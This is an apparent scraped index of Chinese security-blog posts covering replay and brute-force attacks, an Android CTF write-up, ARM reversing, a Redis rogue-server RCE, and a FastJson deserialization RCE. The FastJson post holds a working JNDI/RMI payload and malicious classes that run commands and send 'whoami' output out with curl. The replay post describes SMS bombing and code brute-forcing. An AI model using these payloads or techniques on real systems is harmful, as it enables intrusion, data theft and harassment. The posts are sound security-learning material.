加密尝试那么尝试使用在线加密，从hook到的结果得知，paramString3就是请求中的FM字段 和请求中携带的sign参数对比为相同参数 本以为会到此为止，但是当仔细查看hook的参数时发现，paramString3中的参数均是缺少标签对的，例如 &lt;root&gt;123&lt;&#x2F;root&gt;&lt;sign&gt;123&lt;&#x2F;sign&gt; 他只显示 123&lt;&#x2F;root&gt;123&lt;&#x2F;sign&gt; 暂没查到原因。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"重放攻击","slug":"重放攻击","date":"2019-08-28T07:19:36.000Z","updated":"2019-08-28T07:25:16.000Z","comments":true,"path":"2019/08/重放攻击/","link":"","permalink":"https://misakikata.github.io/2019/08/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/","excerpt":"","text":"重放攻击1. 漏洞简介​ 首先简单看一下百度百科对重放攻击的简介：重放攻击(Replay Attacks)又称重播攻击、回放攻击，是指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。重放攻击可以由发起者，也可以由拦截并重发该数据的敌方进行。攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。 2. 漏洞原理​ 重放攻击的基本原理就是把以前窃听到的数据原封不动地重新发送给接收方。很多时候，网络上传输的数据是加密过的，此时窃听者无法得到数据的准确意义。但如果他知道这些数据的作用，就可以在不知道数据内容的情况下通过再次发送这些数据达到愚弄接收端的目的。 3. 漏洞危害​ 重放攻击本身只是一种行为和方式，并不会直接造成系统的危害，可能在某些系统中，过多和高频次的重复会对系统造成压力。重放攻击的重要点在于重放的是可以造成目的效果的数据包，从而达到修改和多次执行的效果。 重放攻击主要是针对系统没有效验请求的有效性和时效性，对于多次请求执行，系统将多次响应。在重放攻击利用最多的形式中，短信轰炸算是重放攻击最直接的利用表现。 4. 常见漏洞类型1. 短信轰炸​ 短线轰炸算是重放攻击中最为直接的利用形式，当系统端没有效验请求的时间差或者只在前端做请求限制的时候，可以无限的请求短信来达到短信轰炸的目的。例如，如下APP请求注册时可以使用手机号和验证码注册登录，但是没有限制短信请求次数和时间间隔。 多次请求后可以在手机上看到请求到的短信 2. 暴力破解​ 暴力破解是重放攻击中，典型的非只重放而达到的攻击类型，而是利用重放这个动作来达到暴力破解的目的。当系统端未做请求验证和错误次数限制时，就可以根据字典或者设定的字符串来破解特定的参数。 a. 暴力破解密码​ 当用户登陆时，缺少验证码或者验证码不失效，并且账号没有错误的次数限制。可以通过暴力破解碰撞密码来登录。例如此处，暴力破解原密码来登陆绑定账号。 此处验证码只判断是否存在，并不失效，且可以多次尝试绑定账号，例如如下，当返回为1的时候就是密码正确，绑定成功。 b. 暴力破解验证码​ 当我们申请修改账号密码等操作时，往往需要给手机号或者邮箱发送一个验证码，当需要修改他们或者越权操作的时候并不一定可以通过修改接收手机或邮箱来收到验证码，这时候可以尝试暴力破解验证码。例如： 对此请求多次重放后发现仍然返回修改密码失败，说明验证码可以多次使用，这种情况下很有可能是验证码在没有正确验证使用时，后台并不会失效。那么我们尝试爆破验证码，如果成功将修改账号密码。 c. 暴力破解参数​ 此情况大都在尝试越权的时候，还有尝试修改某些不可知但是可预测的参数，例如此篇文章： 重置凭证可暴破 d. 暴力破解hash密码​ 此种暴力破解类似破解密码，但此种一般不需要考虑某些验证条件，常在获取到主机权限后，利用hash抓取工具获得，例如Windows平台的hash抓取工具：mimikaze， pwdump7等。获取到Windows的NTLM。 Administrator:500:aad3b435b51404eeaad3b435b51404ee:44f077e27f6fef69e7bd834c7242b040::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 常见的爆破工具：Ophrack、John the Ripper、hashcat 这种方式都需要提前准备彩虹表，当然kail上也有集成，同时也有默认字典。 3. 重放支付​ 这种情况往往出现在支付订单的时候，支付到最后一个请求包时，系统收到请求就会确定已支付下单。这时候在系统没有做出准确效验的时候就会根据是否支付成功的验证字段来确定下单，多次重放的时候，系统会根据暂无失效且正常的请求下单。来达到使用同一请求多次获取成功的订单。 ​ 但这种情况，现在已经很少会遇到，上一次遇到还要追溯到去年初了。 4. 重放修改密码​ 在很多时候，我们修改密码等操作的时候，是分几步完成的，例如先验证手机验证码，跳转在修改密码。如果在最后确认修改的时候抓包多次重放，可以达到免验证来达到修改密码的作用。也就是这里并没有强制效验手机号和验证码。也就存在了任意修改密码的可能，当然要是效验了手机号和验证码的对应关系，也许就不可以了。 POST &#x2F;userpwd?p&#x3D;1 HTTP&#x2F;1.1 Host: xxx.com phone&#x3D;13111111111&amp;code&#x3D;123456 当我们如上的去请求验证码效验的时候，如果通过会跳往第二个页面修改密码 POST &#x2F;userpwd?p&#x3D;2 HTTP&#x2F;1.1 Host: xxx.com phone&#x3D;13111111111&amp;pwd&#x3D;123456&amp;newpwd&#x3D;123456 当只是简单的重置的时候，先不谈越权问题，这个包都可能造成多次修改多次重置密码。而并不用验证。 POST &#x2F;userpwd?p&#x3D;2 HTTP&#x2F;1.1 Host: xxx.com phone&#x3D;13111111111&amp;code&#x3D;123456&amp;pwd&#x3D;123456&amp;newpwd&#x3D;123456 在修改密码的时候遇到也携带了其他的参数，例如之前的短信验证字段，那么就不一定会造成越权，但可能会有多次重放修改密码的可能。这时候如果需要修改他人密码，就需要爆破验证码来达到效果。这就回到了暴力破解中的验证码爆破。 POST &#x2F;userpwd HTTP&#x2F;1.1 Host: xxx.com email&#x3D;qq@qq.com&amp;code&#x3D;123456 有些系统在重置密码的时候并不是需要各种验证，而是你申请修改就会给你发送重置的密码到你的注册邮箱。例如如上数据包，当验证存在邮箱的时候，只需要输入图片验证码就会发送已经被重置的新密码到指定邮箱。这时候虽然我们不能获取密码，但是缺少验证的方式可导致其他账号密码被重复修改，而影响他人的登陆。真可谓损人不利己的好用处。233333 5. 条件竞争条件竞争是后台对共享数据读写的时候，多线程没有对共享数据执行线程锁，导致在多个线程获取到的值并不是当前线程操作的实时值，典型的例子是，一份钱买多份。 例如去年护网杯的Itshop，此处给出WP以便参考：https://www.codercto.com/a/31463.html 5. 漏洞靶场漏洞环境：Django2.2、python3 此处利用的是之前写的一个bug平台，当验证会提示如下时，可以根据提示的不同来判断密码是否正确，当密码正确的时候就会跳转到内部页面。 def login(request): if request.method &#x3D;&#x3D; &#39;POST&#39;: login_form &#x3D; forms.UserForm(request.POST) message &#x3D; &#39;请检查填写的内容！&#39; if login_form.is_valid(): username &#x3D; login_form.cleaned_data.get(&#39;username&#39;) password &#x3D; login_form.cleaned_data.get(&#39;password&#39;) try: user &#x3D; models.User.objects.get(name&#x3D;username) except : message &#x3D; &#39;用户不存在！&#39; return render(request, &#39;login&#x2F;login.html&#39;, locals()) if user.password &#x3D;&#x3D; password: request.session[&#39;is_login&#39;] &#x3D; True request.session[&#39;user_id&#39;] &#x3D; user.id request.session[&#39;user_name&#39;] &#x3D; user.name return redirect(&#39;&#x2F;index&#x2F;&#39;) else: message &#x3D; &#39;密码不正确！&#39; return render(request, &#39;login&#x2F;login.html&#39;, locals()) else: return render(request, &#39;login&#x2F;login.html&#39;, locals()) login_form &#x3D; forms.UserForm() return render(request, &#39;login&#x2F;login.html&#39;, locals()) 抓包登陆，在没有验证码，且csrf_token在没有起到唯一性的时候，可以通过爆破密码登陆。 把数据包丢到Intruder中，多次爆破后发现当密码正确的时候会产生302的跳转。 漏洞修复：添加验证码，虽然此处可以添加框架自带的验证码，但建议使用请求式验证码。如不能使用验证码也可以给账号登陆错误次数做一次限制。 6. 漏洞测试工具重复攻击一般采用可以抓包的工具都可以重复，例如：Charles、burp等。此处较为常用burp。因为在payload上，处理较为灵活，当然如果需要的只是重放，Charles应该不会让你失望。 burp: https://portswigger.net/burp Charles：https://www.charlesproxy.com/ 7. 漏洞修改 添加图片验证码，为了应对偏爆破类的重放攻击，添加验证字段是最简单有效的手段。当然你要保证验证是在一次使用后及时失效。 限制请求次数，有些地方并不适用于添加验证码，或者不能添加验证码。这时候针对同一账户的错误次数限制就显得很有必要。例如，当错误次数连续达到五次的时候，暂时十分钟内不能登陆。 效验验证码和用户身份，某些重放攻击是利用了手机号和验证码之间的不对应性，特别是在修改密码等处，这时候需要把验证码和请求的用户手机号做联系，当重放或者越权的时候根据验证码次数和对应关系来判断是否允许修改。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"2018 SWPUCTF","slug":"2018-SWPUCTF","date":"2019-08-26T09:54:14.000Z","updated":"2019-08-26T09:55:50.000Z","comments":true,"path":"2019/08/2018-SWPUCTF/","link":"","permalink":"https://misakikata.github.io/2019/08/2018-SWPUCTF/","excerpt":"","text":"某日在GitHub中看到了一些CTF使用的安卓逆向分析题，其中一个是SWPUCTF，是个没怎么听过的CTF。虽然我不怎么了解CTF。23333 于是，抽时间分析看看是否可以做出来。两个APK。 app-debug1.apk把apk丢到AK中，反编译，结果中有一个目录是assert/timg_2.zip。讲道理，第一反应看到这个，肯定是多多少少有点关系的，本以为是做了代码抽取，动态加载。 但是这并不是一个zip包，使用010editor查看，发现真不是一个zip包，而是一个完整的jpg格式文件。 而在文件nextcontent.class中也发现了这个所谓的zip包被当作jpg来读取。 直接修改为jpg格式图片，打开。 嗯。。。。这就。。。肯定是姿势不对，换一种方式。 既然此处是纯JAVA层文件，是对输入的密码的效验，那么采用调试的方式来做。 此处采用jeb调试，其中，对密码效验的关键方法为check。 方法开始先判断长度是否为12位，然后判断是否长度为0。 先修改check下： 00000000 const&#x2F;16 v5, 12 00000004 const&#x2F;4 v2, 0 00000006 invoke-virtual String-&gt;toCharArray()[C, p1 0000000C move-result-object v1 0000000E array-length v3, v1 00000010 if-eq v3, v5, :16 #if-ne 或者添加const&#x2F;16 v3, 0xc 在修改mainactivity类中onclick方法下的 0000001E new-instance v0, Check 00000022 invoke-direct Check-&gt;&lt;init&gt;()V, v0 00000028 invoke-virtual Check-&gt;checkPassword(String)Z, v0, v2 0000002E move-result v3 00000030 if-eqz v3, :72 #修改为if-nez 重编译安装，输入任意值跳到第二部分，此时显示图片，但是图片上并没有相应的字符串。 继续调试第二部分。调试的时候发现jeb仍然是不好用，于是改用Androidstudio。在mainactivity2$1.smail文件中找到了读取第二个输入并且做对比的地方。 .method public onClick(Landroid&#x2F;view&#x2F;View;)V .locals 3 .param p1, &quot;v&quot; # Landroid&#x2F;view&#x2F;View; .prologue .line 29 iget-object v2, p0, Lcom&#x2F;example&#x2F;test&#x2F;ctf02&#x2F;MainActivity2$1;-&gt;this$0:Lcom&#x2F;example&#x2F;test&#x2F;ctf02&#x2F;MainActivity2; iget-object v2, v2, Lcom&#x2F;example&#x2F;test&#x2F;ctf02&#x2F;MainActivity2;-&gt;editText:Landroid&#x2F;widget&#x2F;EditText; invoke-virtual &#123;v2&#125;, Landroid&#x2F;widget&#x2F;EditText;-&gt;getText()Landroid&#x2F;text&#x2F;Editable; move-result-object v2 const-string v2, &quot;android.is.very.fun&quot; #增加 invoke-virtual &#123;v2&#125;, Ljava&#x2F;lang&#x2F;Object;-&gt;toString()Ljava&#x2F;lang&#x2F;String; move-result-object v1 .line 30 .local v1, &quot;str&quot;:Ljava&#x2F;lang&#x2F;String; new-instance v0, Landroid&#x2F;content&#x2F;Intent; invoke-direct &#123;v0, v1&#125;, Landroid&#x2F;content&#x2F;Intent;-&gt;&lt;init&gt;(Ljava&#x2F;lang&#x2F;String;)V .line 31 .local v0, &quot;intent&quot;:Landroid&#x2F;content&#x2F;Intent; iget-object v2, p0, Lcom&#x2F;example&#x2F;test&#x2F;ctf02&#x2F;MainActivity2$1;-&gt;this$0:Lcom&#x2F;example&#x2F;test&#x2F;ctf02&#x2F;MainActivity2; invoke-virtual &#123;v2, v0&#125;, Lcom&#x2F;example&#x2F;test&#x2F;ctf02&#x2F;MainActivity2;-&gt;sendBroadcast(Landroid&#x2F;content&#x2F;Intent;)V .line 32 return-void .end method 获取了Broadcast组件，在mainfast.xml文件中有关于这个组件的定义，于是在上把v2修改为组件名字符串。 重编译安装，第一个输入只需要随便输入几个不重复的字母，跳到第二个输入，只需要点击确认，就会弹出写有flag的图片。 app-debug2.apk同样，丢到AK中反编译，反编译内容如下，其中包含JNI.smail文件，所以大概率是分析so文件。 在MainActivity$1.smali中看到了jni的调用getResult方法。 .method public onClick(Landroid&#x2F;view&#x2F;View;)V .locals 3 .param p1, &quot;v&quot; # Landroid&#x2F;view&#x2F;View; .prologue .line 24 iget-object v2, p0, Lcom&#x2F;example&#x2F;test&#x2F;ctf03&#x2F;MainActivity$1;-&gt;this$0:Lcom&#x2F;example&#x2F;test&#x2F;ctf03&#x2F;MainActivity; iget-object v2, v2, Lcom&#x2F;example&#x2F;test&#x2F;ctf03&#x2F;MainActivity;-&gt;pwd:Landroid&#x2F;widget&#x2F;EditText; invoke-virtual &#123;v2&#125;, Landroid&#x2F;widget&#x2F;EditText;-&gt;getText()Landroid&#x2F;text&#x2F;Editable; move-result-object v2 invoke-virtual &#123;v2&#125;, Ljava&#x2F;lang&#x2F;Object;-&gt;toString()Ljava&#x2F;lang&#x2F;String; move-result-object v1 .line 25 .local v1, &quot;str&quot;:Ljava&#x2F;lang&#x2F;String; invoke-static &#123;v1&#125;, Lcom&#x2F;example&#x2F;test&#x2F;ctf03&#x2F;JNI;-&gt;getResult(Ljava&#x2F;lang&#x2F;String;)I move-result v0 .line 26 .local v0, &quot;result&quot;:I iget-object v2, p0, Lcom&#x2F;example&#x2F;test&#x2F;ctf03&#x2F;MainActivity$1;-&gt;this$0:Lcom&#x2F;example&#x2F;test&#x2F;ctf03&#x2F;MainActivity; invoke-virtual &#123;v2, v0&#125;, Lcom&#x2F;example&#x2F;test&#x2F;ctf03&#x2F;MainActivity;-&gt;Show(I)V .line 27 return-void .end method 使用IDA打开lib目录下的libNative.so文件。 在Exports中找到对应的方法，在F5一下查看伪代码 此处先判断是否是长度为15位，然后用malloc申请三个长度为一字节的变量来初始化。至于Init函数是做什么用的。在如下处，点击进入，看到其中又调用了Init函数，再点击进入。 .text:000011B0 MOV R3, R8 ; char * .text:000011B2 BLX j__Z4InitPcS_S_PKci 在如下地址处： 不过，并没看懂这是啥意思。。。。先继续往下看。 后面使用了First函数进行处理，如下处。 .text:000011B6 MOV R0, R6 ; char * .text:000011B8 BLX j__Z5FirstPc ; First(char *) .text:000011BC CBZ R0, loc_11DA 点击到函数内找到First函数，查看F5 signed int __fastcall First(char *a1) &#123; int v1; &#x2F;&#x2F; r1@1 int v2; &#x2F;&#x2F; r0@3 signed int v3; &#x2F;&#x2F; r1@3 v1 &#x3D; 0; do &#123; a1[v1] &#x3D; 2 * a1[v1] ^ 0x80; ++v1; &#125; while ( v1 !&#x3D; 4 ); v2 &#x3D; strcmp(a1, &quot;LN^dl&quot;); v3 &#x3D; 0; if ( !v2 ) v3 &#x3D; 1; return v3; &#125; 把传进来的字符串进行按位乘2和0x80异或，如果等于LN^dl，返回v3为1，不等于则返回v3为0。那么此处需要v3等不等于0呢，查看主要函数的下一步判断是if非，跳转到LABEL_14处，那么需要v3不为0，也就是a1等于LN^dl。同样代表了传入的字符串要乘2异或0x80后等于LN^dl。 其中需要v4跟一个字符串对于，字符串为以下 0x20, 0x35, 0x2D, 0x16, 0x61 整体的逻辑就是先分成三个字符串，然后判断第一个异或处理后是否为LN^dl，是的话对下一个字符串异或，对比相等，继续处理最后一个字符串，等于AFBo}则返回需要的1。那么就剩下一个Init不确定意义，根据分配的大小和函数的内容，猜测应该是把15位的字符串，每一位分配给三个字符串组，毕竟Init中有一个循环操作，且标志增加。也就是 123456分配两组： 135 246 尝试写脚本反向异或出原字符串。 str1 &#x3D; &quot;LN^dl&quot; #v3 str2 &#x3D; [0x20, 0x35, 0x2D, 0x16, 0x61] #v4 str3 &#x3D; &quot;AFBo&#125;&quot; #v5 flagstr1 &#x3D; &#39;&#39; flagstr2 &#x3D; &#39;&#39; flagstr3 &#x3D; &#39;&#39; i &#x3D; 0 while i&lt;&#x3D;4: flagstr &#x3D; str2[i] ^ ord(str3[i]) flagstr3 &#x3D; flagstr3 + chr(flagstr) i+&#x3D;1 print(flagstr3) #原字符串后部分 i&#x3D; 0 while i&lt;&#x3D;4: flagstr &#x3D; ord(str1[i]) ^ str2[i] flagstr2 &#x3D; flagstr2 + chr(flagstr) i+&#x3D;1 print(flagstr2) #原字符串中间部分 i&#x3D;0 while i&lt;&#x3D;4: flagstr &#x3D; (ord(str1[i])^ 0x80 ) &#x2F;&#x2F; 2 flagstr1 &#x3D; flagstr1 + chr(flagstr) i+&#x3D;1 print(flagstr1) #原字符串开始部分 flagstr &#x3D; &#39;&#39; for x in range(len(str1)): flagstr4 &#x3D; flagstr1[x]+flagstr2[x]+flagstr3[x] flagstr &#x3D; flagstr + flagstr4 print(flagstr) 但是结果很怪，肯定是后面出了问题，但是理论上异或处理是错的，不该只出现在最后一位上，后面找了官方的WP，看了别人的Java版poc，感觉也一样。莫非是一些编码和语言上处理的差别？暂时没处理掉此问题。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"结构体链表逆向","slug":"结构体链表逆向","date":"2019-07-26T09:23:50.000Z","updated":"2019-07-26T09:56:41.000Z","comments":true,"path":"2019/07/结构体链表逆向/","link":"","permalink":"https://misakikata.github.io/2019/07/%E7%BB%93%E6%9E%84%E4%BD%93%E9%93%BE%E8%A1%A8%E9%80%86%E5%90%91/","excerpt":"","text":"结构体链表逆向同样使用如下的C代码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; typedef struct _student &#123; char name[32]; int age; struct _student * next; &#125;T_student; T_student * head &#x3D; NULL; void Insert(const char *name,int age) &#123; T_student * newnode; newnode &#x3D; (T_student *)malloc(sizeof(T_student)); newnode-&gt;age &#x3D; age; newnode-&gt;next &#x3D; head; strcpy(newnode-&gt;name,name); head &#x3D; newnode; &#125; void PrintStudent() &#123; T_student * tmp; tmp &#x3D; head; while(tmp) &#123; printf(&quot;name:%s age:%d\\n&quot;,tmp-&gt;name,tmp-&gt;age); tmp&#x3D;tmp-&gt;next; &#125; &#125; int main() &#123; Insert(&quot;Panda&quot;,15); Insert(&quot;Dog&quot;,3); Insert(&quot;Cat&quot;,2); Insert(&quot;XiaoMing&quot;,20); PrintStudent(); &#125; 按照惯例，编译把文件丢到IDA，找到main函数，点开。可以看到调用了四次insert函数和PrintStudent函数。 点到insert函数中查看函数实现。传入两个参数后，后面调用了malloc函数来分配内存空间，R3就可以看做是malloc分配来的内存并且指向此块内存的指针。其后使用dest来表示这个指针。var_14把内存数据存入dest加偏移量为32的地址上。也就是把第二个int参数存入相应地址。获取head变量，LDR把head变量当作地址来加载其上的数据，head同样可能是指针。而后会把第一个参数和head指针数据同样存入到结构体对应的地址上。只是第一个参数使用了strcpy来复制，顺便一提可能会产生数据覆盖。最后指针dest存到head的地址上，由head来表示基地址。 后面再看一下PrintStudent函数。将head的地址值存到新的指针中。以下仍然使用*head表示存入的地址上的数据。判断值为指针是否为0，从而进行遍历，到此为止基本可以看到前面的结构体存入参数和head赋值，完成了一个链表的结构。此处是遍历链表判断是否遍历完成。 获取到第一个第二个参数后，var_8指针由参数三来进行下一个结构体的查询。 实现大致如下，当执行第一次insert函数时，写入一个结构体，并且把结构体的基地址写入head指针，第二次执行insert函数时，把head指针写入第二个结构体的第三个参数也就是结构体的指向下一个节点的指针。完成一个链表的创建。按照执行顺序，从后往前执行，第三个参数也就是节点的指针是前一个结构体的基地址。直到遍历完成，指针为null。 至此，结构体链表的分析就算完成了。无名侠的这个课程也算是结束了，不得不说多看几遍还是有不少的收获。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"ARM数组重定向","slug":"ARM数组重定向","date":"2019-07-26T09:23:36.000Z","updated":"2019-07-26T09:56:13.000Z","comments":true,"path":"2019/07/ARM数组重定向/","link":"","permalink":"https://misakikata.github.io/2019/07/ARM%E6%95%B0%E7%BB%84%E9%87%8D%E5%AE%9A%E5%90%91/","excerpt":"","text":"ARM数组重定向使用如下的C代码做演示，代码是无名侠的一份数组演示代码。如下： #include &lt;stdio.h&gt; &#x2F;&#x2F; Arrays int g_Table[100]; int g_Table2[100]; void PrintAddr() &#123; printf(&quot;g_Table:0x%x\\ng_Table2:%x\\n&quot;,g_Table,g_Table2); &#125; void InitTable() &#123; int i; for(i&#x3D;0;i&lt;100;i++) g_Table[i] &#x3D; i; printf(&quot;Table1 init ok\\n&quot;); for(i&#x3D;0;i&lt;100;i++) g_Table2[i] &#x3D; i; &#125; int search(int key) &#123; int i&#x3D;0; for(;i&lt;100;i++) &#123; if(g_Table[i]&#x3D;&#x3D;key) return i; &#125; return -1; &#125; int read(int x) &#123; return g_Table[x]; &#125; void write(int x,int value) &#123; g_Table[x] &#x3D; value; &#125; int main() &#123; int idx; PrintAddr(); InitTable(); write(2,200); write(6,900); if((idx &#x3D; search(200))!&#x3D;-1) write(idx,400); &#125; 利用之前的makefile文件进行编译，打可执行文件丢入IDA中打开。选择main函数，大概就是酱紫 选择第一个函数PrintAddr来查看其中的实现代码。根据其中的注释就可以看出来输出是的打印g_Table和g_Table2。 而对于其中的这两个参数只有类似如下数组地址值，所以打印就是数组的地址。 .text:00000400 LDR R2, &#x3D;(g_Table_ptr - 0x1FE4) .text:00000404 LDR R2, [R3,R2] ; g_Table 回到main函数中，重新选择InitTable函数，在图表视图中可以看到此函数实现了两个循环，具体是哪种循环暂不得知，首先查看第一个循环，从开始的循环赋值和比较开始， 在左侧的循环体中，获取的是循环变量的值，在STR指令中，把循环变量存入到了R3(g_Table数组的地址值)，R2、*4代表了int型的四字节长度，所以此处意义是array[i] = i。按照循环变量的增长值按顺序存入到了数组中。 当循环变量大于99时，跳出循环走到右边的步骤，获取R3的地址值，R3则代表的是一串字符串，其后使用puts输出，利用puts是输出后，会自动在其后添加换行符。然后再对循环体重赋值。 继续查看第二个循环体，由于跟第一个循环一致，不在细看。 分析完InitTable函数后，可以得知，这是一个对全局数组进行赋值的操作。也许后面会用到这个数组。回到main函数中，其后调用了两次write函数，对每个write函数进行两个参数的引用。查看write函数。 函数跟InitTable其中对数组的操作类似，都是根据参数进入数组的赋值，如下的对write函数中的第一个参数作为数组的下标，以第二个参数作为需要重新赋值的数组值。array[var_8] = var_c。 在去选择search函数，查看函数实现和逻辑，其中传入参数var_10为200，进入循环判断是否大于99，进入循环体，获取数组的下标对应的值，来和传入的参数进行对比不相同则跳转继续循环。相同则跳出循环，获取数组下标值返回，类似如下 R1 &#x3D; array[var_8] &#x3D; array[i] R3 &#x3D; var_10 &#x3D; 200 if array[var_8] &#x3D;&#x3D; var_10: return var_8 最后的main函数，重新调用了write函数，利用search的返回值来判断是否是-1，CMN是做负数对比。而R3的负数来源search函数的大于99后仍然没有找到返回值时，返回-1。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"Redis 主从复制","slug":"Redis-主从复制","date":"2019-07-15T02:16:27.000Z","updated":"2019-07-15T02:37:01.000Z","comments":true,"path":"2019/07/Redis-主从复制/","link":"","permalink":"https://misakikata.github.io/2019/07/Redis-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/","excerpt":"","text":"Redis主从复制redis主从复制，前几天分享的新版redis未授权利用的新型方式。 什么是主从复制，http://blog.itpub.net/31545684/viewspace-2213629/ 通过redis命令来设置主从机 127.0.0.1:6379&gt; slaveof 192.168.253.131 6379 被设置的主机将通过SYNC来和主机通信， 通过日志可以看到请求的sync连接。 首先需要一个高版本的redis服务，https://redis.io/download。下载后按照官网给的安装步骤来安装。 安装后修改redis.conf文件来执行redis，修改文件中的绑定本地地址的参数项，开启任意地址访问。 执行命令：src/redis-server ./redis.conf，开启redis成功。 下载脚本：https://github.com/Dliv3/redis-rogue-server。启动执行脚本 脚本执行完后显示： 同时可以看到redis日志中加载了so文件： 连接redis执行命令： 所以在未授权访问和弱密码登陆的情况下此问题才可以利用。 原文章：https://paper.seebug.org/975/","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"FastJson 反序列化","slug":"FastJson-反序列化","date":"2019-07-15T02:16:07.000Z","updated":"2019-07-15T02:35:30.000Z","comments":true,"path":"2019/07/FastJson-反序列化/","link":"","permalink":"https://misakikata.github.io/2019/07/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"FastJson 反序列化前一段时间HW护出来一个FastJson的RCE。网上遍布了利用的poc。此处简单模拟一下触发流程。 先下载1.2.47的FastJson，地址：http://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.47/FastJson-1.2.47.jar 利用的JDK为，java_8u60。地址：https://download.oracle.com/otn/java/jdk/8u60-b27/jdk-8u60-windows-x64.exe 使用的IDE为IDEA，下载FastJson后导入IDEA。 从File - Project Structure - Modules - Dependencies导入 创建poc为如下： import com.alibaba.fastjson.JSON; public class poc &#123; public static void main(String[] argv) &#123; String payload &#x3D; &quot;&#123;\\&quot;name\\&quot;:&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;&#125;,&quot; + &quot;\\&quot;xxxx\\&quot;:&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;dataSourceName\\&quot;:&quot; + &quot;\\&quot;rmi:&#x2F;&#x2F;localhost:1099&#x2F;Exploit\\&quot;,\\&quot;autoCommit\\&quot;:true&#125;&#125;&#125;&quot;; JSON.parse(payload); &#125; &#125; 创建一个RMI服务器。可以利用如下的JAVA代码。 import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class rmiServer &#123; public static void main(String[] args) throws Exception &#123; Registry registry &#x3D; LocateRegistry.createRegistry(1099); Reference reference &#x3D; new Reference(&quot;Exloit&quot;, &quot;Exploit&quot;,&quot;http:&#x2F;&#x2F;localhost:8000&#x2F;&quot;); ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(reference); registry.bind(&quot;Exploit&quot;,referenceWrapper); &#125; &#125; 或者采用mar创建一个RMI服务器。 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;localhost:8000&#x2F;#Exploit 再开启一个HTTP服务，下面写入一个恶意class文件。 import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.util.Hashtable; public class Exploit implements ObjectFactory &#123; @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) &#123; exec(&quot;xterm&quot;); return null; &#125; public static String exec(String cmd) &#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return &quot;&quot;; &#125; public static void main(String[] args) &#123; exec(&quot;123&quot;); &#125; &#125; 此处利用mar创建的RMI服务器来验证： 查看HTTP服务，可以看到请求的恶意class请求。 如果请求了RMI服务后一直卡在没有请求HTTP服务的话，可以查看一下防火墙设置。我就不说卡在这里多久了。23333 当然如果也可以使用之前老RCE的恶意class文件 import java.io.BufferedInputStream; import java.io.BufferedReader; import java.io.InputStreamReader; public class exploit2 &#123; public static String exec(String cmd) throws Exception &#123; String sb &#x3D; &quot;&quot;; BufferedInputStream in &#x3D; new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream()); BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in)); String lineStr; while ((lineStr &#x3D; inBr.readLine()) !&#x3D; null) sb +&#x3D; lineStr + &quot;\\n&quot;; inBr.close(); in.close(); return sb; &#125; public exploit2() throws Exception &#123; String result &#x3D; &quot;&quot;; result &#x3D; exec(&quot;whoami&quot;); String cmd&#x3D;&quot;curl http:&#x2F;&#x2F;localhost:8000&#x2F;&quot;+result; throw new Exception(exec(cmd)); &#125; public static void main(String[] args) throws Exception &#123; String result &#x3D; &quot;&quot;; result &#x3D; exec(&quot;whoami&quot;); String cmd&#x3D;&quot;curl http:&#x2F;&#x2F;localhost:8000&#x2F;&quot;+result; throw new Exception(exec(cmd)); &#125; &#125; 执行后，查看携带响应的请求 内容部分POC来源：https://www.03sec.com/3240.shtml","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"逆向函数分析引用","slug":"逆向函数分析引用","date":"2019-07-09T08:56:32.000Z","updated":"2019-07-26T09:56:38.000Z","comments":true,"path":"2019/07/逆向函数分析引用/","link":"","permalink":"https://misakikata.github.io/2019/07/%E9%80%86%E5%90%91%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90%E5%BC%95%E7%94%A8/","excerpt":"","text":"代码编译，使用代码如下: #include &lt;stdio.h&gt; #include &lt;string.h&gt; int fun1() &#123; int a; int b; b&#x3D;10; a&#x3D;b++; return a; &#125; int fun2(int a,int b) &#123; return a+b+fun1(); &#125; int fun3(int a,int b,int c,int d,int e,int f,int g,int h) &#123; if(a+b+c &lt; d+e+f)&#123; return a+b+c+fun2(a,f); &#125;else if(a+b+c &gt; d+e+f)&#123; return a+b+c+fun2(b,e); &#125;else&#123; return 0; &#125; &#125; int main() &#123; int tmp; 